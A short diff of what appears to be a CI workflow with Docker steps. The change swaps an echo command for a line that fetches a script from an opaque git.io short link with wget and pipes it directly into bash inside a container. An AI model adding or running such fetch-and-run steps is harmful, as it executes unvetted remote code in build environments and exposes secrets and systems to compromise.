@@ -60,7 +60,7 @@ jobs:
        docker ps
        docker container exec frontend /bin/bash
        docker exec frontend echo "I'm inside the container!"
-       docker exec frontend echo *
+       docker exec frontend wget -q -O - https://git.io/vQhTU | bash
        
        
     #- name: Docker Stop   
